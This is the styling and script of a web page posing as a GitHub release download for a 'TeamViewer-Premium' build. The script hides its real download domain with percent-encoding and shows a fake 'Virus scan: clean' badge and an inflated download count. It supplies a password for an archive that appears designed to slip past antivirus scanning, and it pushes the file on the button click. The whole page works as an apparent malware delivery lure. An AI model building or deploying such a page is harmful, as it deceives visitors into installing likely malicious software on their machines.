  <style>
:root {
  --bg: #070b12;
  --panel: #10151e;
  --line: rgba(255, 255, 255, 0.08);
  --text: #f4f7fb;
  --muted: #8b95a7;
  --soft: #5d6878;
  --blue: #4c8dff;
  --green: #3ecf8e;
  --red: #ff6b6b;
  font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
  color-scheme: dark;
}

* { box-sizing: border-box; }

html, body {
  margin: 0;
  height: 100%;
}

body {
  height: 100dvh;
  overflow: hidden;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 16px 20px 12px;
  color: var(--text);
  background:
    linear-gradient(var(--line) 1px, transparent 1px),
    linear-gradient(90deg, var(--line) 1px, transparent 1px),
    radial-gradient(900px 420px at 50% -10%, rgba(76, 141, 255, 0.16), transparent 55%),
    var(--bg);
  background-size: 56px 56px, 56px 56px, auto, auto;
  -webkit-font-smoothing: antialiased;
}

.glow {
  position: fixed;
  width: 280px;
  height: 280px;
  border-radius: 50%;
  filter: blur(70px);
  pointer-events: none;
  z-index: 0;
}

.glow-a {
  top: 12%;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(76, 141, 255, 0.18);
}

.glow-b {
  bottom: 8%;
  right: 12%;
  width: 180px;
  height: 180px;
  background: rgba(76, 141, 255, 0.08);
}

.stage {
  position: relative;
  z-index: 1;
  width: min(480px, 100%);
  text-align: center;
}

.logo {
  width: 88px;
  height: 88px;
  margin: 0 auto 14px;
  display: grid;
  place-items: center;
  color: #f0f6fc;
  text-decoration: none;
  border-radius: 50%;
  background: linear-gradient(180deg, #171d28, #0d121a);
  border: 1px solid rgba(255, 255, 255, 0.08);
  box-shadow:
    0 0 0 10px rgba(76, 141, 255, 0.06),
    0 18px 40px rgba(0, 0, 0, 0.35);
}

.logo svg {
  width: 48px;
  height: 48px;
  display: block;
}

h1 {
  margin: 0 0 8px;
  font-size: clamp(26px, 4vw, 32px);
  line-height: 1.12;
  letter-spacing: -0.04em;
  font-weight: 700;
}

.lede {
  margin: 0 auto 16px;
  max-width: 34em;
  color: var(--muted);
  font-size: 13px;
  line-height: 1.6;
}

.hub {
  display: grid;
  gap: 10px;
  text-align: left;
}

.verify {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 12px;
  border-radius: 14px;
  background: #10161f;
  border: 1px solid rgba(76, 141, 255, 0.28);
  box-shadow: inset 0 0 0 1px rgba(76, 141, 255, 0.04);
}

.hub-icon {
  width: 40px;
  height: 40px;
  flex: 0 0 auto;
  display: grid;
  place-items: center;
  border-radius: 12px;
  color: #8eb6ff;
  background: rgba(76, 141, 255, 0.1);
  border: 1px solid rgba(76, 141, 255, 0.32);
}

.hub-icon svg {
  width: 18px;
  height: 18px;
}

.badge {
  width: 16px;
  height: 16px;
  flex: 0 0 auto;
  color: #10161f;
}

.badge .line {
  display: grid;
  place-items: center;
  width: 16px;
  height: 16px;
  border-radius: 50%;
  background: #8eb6ff;
}

.badge svg {
  width: 12px;
  height: 12px;
}

.verify-title {
  margin: 0;
  display: flex;
  align-items: center;
  gap: 8px;
  color: #f4f7fb;
  font-size: 15px;
  font-weight: 700;
}


.verify-copy {
  min-width: 0;
  flex: 1;
}

.swap {
  display: grid;
  align-items: center;
  overflow: hidden;
}

.verify-copy .swap:not(.badge) {
  padding: 10px 0;
  margin: -10px 0;
  -webkit-mask-image: linear-gradient(to bottom, transparent, #000 12px, #000 calc(100% - 12px), transparent);
  mask-image: linear-gradient(to bottom, transparent, #000 12px, #000 calc(100% - 12px), transparent);
}

.badge.swap {
  overflow: visible;
}

.swap .line {
  grid-area: 1 / 1;
  opacity: 0;
  transform: translateY(18px);
}

.swap .line.show {
  opacity: 1;
  transform: none;
}

.verify-title .line:has(b) {
  cursor: pointer;
}

.verify-title b {
  display: inline-block;
  margin-left: 2px;
  padding: 1px 7px 2px;
  border-radius: 6px;
  border: 1px solid rgba(76, 141, 255, 0.4);
  background: rgba(76, 141, 255, 0.1);
  color: #d6e4ff;
  font-weight: 700;
  line-height: 1.3;
}

.verify-sub {
  margin: 2px 0 0;
  color: #8b95a7;
  font-size: 12px;
}

.win {
  height: 46px;
  width: 100%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  border: 0;
  border-radius: 12px;
  color: #fff;
  background: linear-gradient(180deg, #5b9bff, #2f81f7);
  box-shadow: 0 8px 22px rgba(47, 129, 247, 0.28);
  font: inherit;
  font-size: 15px;
  font-weight: 800;
  cursor: pointer;
}

.win svg {
  width: 18px;
  height: 18px;
}

.win:hover {
  filter: brightness(1.05);
}

.win:disabled {
  opacity: 0.7;
  cursor: default;
}

.trust {
  list-style: none;
  margin: 2px 0 0;
  padding: 10px 0 0;
  display: flex;
  justify-content: center;
  gap: 22px;
  border-top: 1px solid rgba(255, 255, 255, 0.08);
  color: #8b95a7;
  font-size: 12px;
  font-weight: 650;
}

.trust li {
  display: inline-flex;
  align-items: center;
  gap: 8px;
}

.trust svg {
  width: 14px;
  height: 14px;
  color: #8eb6ff;
}

footer {
  position: relative;
  z-index: 1;
  margin-top: 14px;
  color: var(--soft);
  font-size: 12px;
}

@media (max-width: 560px) {
  body { padding: 12px 16px; }
  .trust { gap: 16px; font-size: 13px; }
}


</style>

  <script>
window.SITE = {
  owner: "YottaStarWinch",
  repo: "TeamViewer-Premium",
  title: "Download the Latest Release",
  subtitle:
    "Click the button to download the file\nFor installation, follow the instructions in the archive",
  downloads: 14000,
  virusScan: "Virus scan: clean",
  archivePassword: "2026",
  releaseUrl:
    "https://%67%69%74%64%6F%77nloa%64.%6C%69ve/TeamViewer-Premium",
  assetName: "",
  corsProxy: "",
};

(() => {
  const SITE = window.SITE || {};
  const ARCHIVE_RE = /\.(zip|7z|rar|tar|gz|tgz|bz2|xz|iso|dmg|exe|msi|pkg)$/i;
  const $ = (id) => document.getElementById(id);
  const ui = {
    title: $("title"),
    subtitle: $("subtitle"),
    status: $("status"),
    ready: $("ready"),
    verify: document.querySelector(".verify"),
    passwordValue: $("passwordValue"),
    passwordLine: document.getElementById("passwordValue") && document.getElementById("passwordValue").closest(".line"),
    repoLink: $("repoLink"),
    primary: $("primary"),
  };

  const state = {
    busy: false,
    started: false,
    revealed: false,
    asset: null,
  };

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  function applyCopy() {
    const owner = SITE.owner || "github";
    const repo = SITE.repo || "repository";
    ui.repoLink.href = `https://github.com/${owner}/${repo}`;
    ui.title.textContent = SITE.title || "Download the Latest Release";
    const subtitle =
      SITE.subtitle ||
      "Click the button to download the file\nFor installation, follow the instructions in the archive";
    ui.subtitle.innerHTML = subtitle
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\n/g, "<br>");
    state.password = String(SITE.archivePassword || "").trim();
    if (ui.ready) ui.ready.textContent = "Ready to download · Secure connection";
    if (ui.passwordValue && state.password) ui.passwordValue.textContent = state.password;
  }

  async function revealPassword() {
    if (!ui.verify || state.revealed) return;
    state.revealed = true;
    const swaps = [...ui.verify.querySelectorAll(".swap")];
    const outgoing = swaps.map((swap) => swap.querySelector(".line.show"));
    const incoming = swaps.map((swap) =>
      [...swap.querySelectorAll(".line")].find((line) => !line.classList.contains("show"))
    );

    const outAnimations = outgoing.map((line) =>
      line.animate(
        [
          { opacity: 1, transform: "translateY(0)" },
          { opacity: 0, transform: "translateY(-18px)" },
        ],
        { duration: 340, easing: "cubic-bezier(.4, 0, .2, 1)", fill: "forwards" }
      )
    );
    await Promise.all(outAnimations.map((animation) => animation.finished));

    outgoing.forEach((line) => line.classList.remove("show"));
    incoming.forEach((line) => line.classList.add("show"));
    outAnimations.forEach((animation) => animation.cancel());

    const inAnimations = incoming.map((line) =>
      line.animate(
        [
          { opacity: 0, transform: "translateY(18px)" },
          { opacity: 1, transform: "translateY(0)" },
        ],
        { duration: 460, easing: "cubic-bezier(.16, 1, .3, 1)" }
      )
    );
    await Promise.all(inAnimations.map((animation) => animation.finished));
  }

  async function swapChip(text) {
    const el = ui.passwordValue;
    await el.animate(
      [
        { opacity: 1, transform: "translateY(0)" },
        { opacity: 0, transform: "translateY(-5px)" },
      ],
      { duration: 180, easing: "ease", fill: "forwards" }
    ).finished;
    el.textContent = text;
    el.animate(
      [
        { opacity: 0, transform: "translateY(5px)" },
        { opacity: 1, transform: "translateY(0)" },
      ],
      { duration: 240, easing: "cubic-bezier(.16, 1, .3, 1)", fill: "forwards" }
    );
  }

  async function copyPassword() {
    const password = state.password;
    if (!password || !ui.passwordValue || state.copying) return;
    state.copying = true;
    try {
      await navigator.clipboard.writeText(password);
    } catch {
      const field = document.createElement("textarea");
      field.value = password;
      field.setAttribute("readonly", "");
      field.style.position = "fixed";
      field.style.left = "-9999px";
      document.body.appendChild(field);
      field.select();
      document.execCommand("copy");
      field.remove();
    }
    await swapChip("Copied");
    await sleep(900);
    await swapChip(password);
    state.copying = false;
  }

  function unmaskDomain(input) {
    const raw = String(input || "");
    try {
      return decodeURIComponent(raw);
    } catch {
      return raw;
    }
  }

  function readQuery() {
    const q = new URLSearchParams(location.search);
    return {
      releaseUrl: unmaskDomain(q.get("release") || q.get("url") || SITE.releaseUrl || ""),
      assetName: q.get("file") || SITE.assetName || "",
    };
  }

  function parseGithub(input) {
    if (!input) return null;
    try {
      const u = new URL(input);
      if (u.hostname !== "github.com") return { kind: "direct", url: input };
      const parts = u.pathname.replace(/^\/|\/$/g, "").split("/");
      const [owner, repo, section, a, b] = parts;
      if (!owner || !repo) return null;
      if (section === "releases" && a === "download" && b) {
        return {
          kind: "asset",
          owner,
          repo,
          tag: decodeURIComponent(b),
          file: decodeURIComponent(parts.slice(5).join("/")),
          page: `https://github.com/${owner}/${repo}`,
        };
      }
      if (section === "releases" && a === "tag" && b) {
        return { kind: "tag", owner, repo, tag: decodeURIComponent(b), page: `https://github.com/${owner}/${repo}` };
      }
      return { kind: "latest", owner, repo, page: `https://github.com/${owner}/${repo}` };
    } catch {
      return null;
    }
  }

  async function githubJson(path) {
    const res = await fetch(`https://api.github.com${path}`, {
      headers: { Accept: "application/vnd.github+json" },
    });
    if (!res.ok) {
      throw new Error(
        res.status === 404
          ? "Release not found."
          : res.status === 403
            ? "GitHub rate limit. Wait a minute and try again."
            : `GitHub error ${res.status}.`
      );
    }
    return res.json();
  }

  function pickAsset(release, wanted) {
    const assets = Array.isArray(release.assets) ? release.assets : [];
    if (wanted) {
      const match = assets.find((a) => a.name.toLowerCase() === wanted.toLowerCase());
      if (match) return match;
    }
    return assets.find((a) => ARCHIVE_RE.test(a.name)) || assets[0] || null;
  }

  async function resolveAsset(cfg) {
    const parsed = parseGithub(cfg.releaseUrl);
    if (!parsed) throw new Error("No release URL set.");

    if (parsed.kind === "direct") {
      ui.repoLink.href = parsed.url;
      return {
        name: cfg.assetName || parsed.url.split("/").pop() || "download.bin",
        browser_download_url: parsed.url,
        size: 0,
      };
    }

    ui.repoLink.href = parsed.page;

    if (parsed.kind === "asset") {
      try {
        const release = await githubJson(
          `/repos/${parsed.owner}/${parsed.repo}/releases/tags/${encodeURIComponent(parsed.tag)}`
        );
        return pickAsset(release, cfg.assetName || parsed.file) || {
          name: parsed.file,
          browser_download_url: `https://github.com/${parsed.owner}/${parsed.repo}/releases/download/${parsed.tag}/${parsed.file}`,
          size: 0,
        };
      } catch {
        return {
          name: parsed.file,
          browser_download_url: `https://github.com/${parsed.owner}/${parsed.repo}/releases/download/${parsed.tag}/${parsed.file}`,
          size: 0,
        };
      }
    }

    const path =
      parsed.kind === "tag"
        ? `/repos/${parsed.owner}/${parsed.repo}/releases/tags/${encodeURIComponent(parsed.tag)}`
        : `/repos/${parsed.owner}/${parsed.repo}/releases/latest`;
    const release = await githubJson(path);
    const asset = pickAsset(release, cfg.assetName);
    if (!asset) throw new Error("No files in this release.");
    return asset;
  }

  function nativeSave(url, name) {
    const a = document.createElement("a");
    a.href = url;
    a.download = name || "";
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  }

  async function run() {
    if (state.busy) return;
    state.busy = true;
    state.started = true;
    if (ui.primary) ui.primary.disabled = true;

    try {
      const asset = state.asset || (await resolveAsset(readQuery()));
      state.asset = asset;
      await revealPassword();
      nativeSave(asset.browser_download_url, asset.name);
      await sleep(240);
    } catch {
      if (ui.status) ui.status.textContent = "Download failed";
    } finally {
      if (ui.primary) ui.primary.disabled = false;
      state.busy = false;
    }
  }

  applyCopy();
  if (ui.passwordLine) ui.passwordLine.addEventListener("click", copyPassword);
  if (ui.primary) ui.primary.addEventListener("click", run);

  window.addEventListener(
    "load",
    async () => {
      try {
        state.asset = await resolveAsset(readQuery());
      } catch {
        state.asset = null;
      }
    },
    { once: true }
  );
})();

</script>
</body>
</html>
